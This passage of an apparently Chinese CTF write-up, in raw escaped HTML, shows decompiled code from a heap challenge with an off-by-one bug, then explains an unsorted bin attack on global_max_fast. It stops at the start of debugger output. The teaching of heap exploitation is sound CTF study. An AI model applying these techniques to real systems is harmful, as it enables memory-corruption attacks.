class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;infomation management:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1. new info&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2. edit info&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;3. delete info&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;4. exit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;gt;&amp;gt; &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; get_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *v0; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = get_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; idx &amp;lt;= &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    size = get_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;gt; &lt;span class=&#34;number&#34;&gt;0x8F&lt;/span&gt; &amp;amp;&amp;amp; size &amp;lt;= &lt;span class=&#34;number&#34;&gt;0x400&lt;/span&gt; )         &lt;span class=&#34;comment&#34;&gt;// size &amp;gt;fast_max_&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      heaplist[idx] = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v0 = sizeL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sizeL[idx] = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub_D47&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = get_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || idx &amp;gt; &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; || !heaplist[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;read_t&lt;/span&gt;(heaplist[idx], sizeL[idx], &lt;span class=&#34;number&#34;&gt;10LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;sub_A70&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 ptr, &lt;span class=&#34;type&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 buf; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-Dh] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v7; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v7 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; ; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( i &amp;gt; size )							&lt;span class=&#34;comment&#34;&gt;//offbyone&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;buf, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;) &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )        &lt;span class=&#34;comment&#34;&gt;// connot input null&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;read error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( buf == a3 )                            &lt;span class=&#34;comment&#34;&gt;// a3=&amp;#x27;\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(_BYTE *)(ptr + i) = buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub_DF5&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *v0; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = get_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; idx &amp;lt;= &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( heaplist[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)heaplist[idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    heaplist[idx] = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;                        &lt;span class=&#34;comment&#34;&gt;// no uaf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v0 = sizeL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sizeL[idx] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;限制了堆块大小，没有输出函数泄露地址，没有 UAF。但 offbyone&lt;/p&gt;
&lt;h2 id=&#34;思路unsortedbins-attack-攻击global_max_fast将堆块放入fastbins&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#思路unsortedbins-attack-攻击global_max_fast将堆块放入fastbins&#34;&gt;#&lt;/a&gt; 思路：unsortedbins attack 攻击 global_max_fast，将堆块放入 fastbins.&lt;/h2&gt;
&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理：&lt;/h2&gt;
&lt;h2 id=&#34;unsorted-bin-概述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unsorted-bin-概述&#34;&gt;#&lt;/a&gt; unsorted bin 概述&lt;/h2&gt;
&lt;p&gt;・当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中&lt;/p&gt;
&lt;p&gt;・释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中&lt;/p&gt;
&lt;p&gt;・当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话&lt;/p&gt;
&lt;p&gt;・Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即&lt;strong&gt;插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;・在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220401163135175.png&#34; alt=&#34;image-20220401163135175&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果我们控制了 bk 的值，我们就能将 unsorted_chunks (av) 写到 bk+0x10 地址，这是一个很大的值&lt;/p&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;p&gt;1，构造 overlap，实现 freechunk 的覆盖&lt;/p&gt;
&lt;p&gt;2：修改 unsorted_chunk 的 bk,&lt;/p&gt;
&lt;p&gt;​		&lt;em&gt;问题，pie 保护导致没有地址，没有输出但上述导致地址无法泄露，如何覆盖到 global_max_fast?&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; heap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56021208d000&lt;/span&gt; PREV_INUSE &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  prev_size = 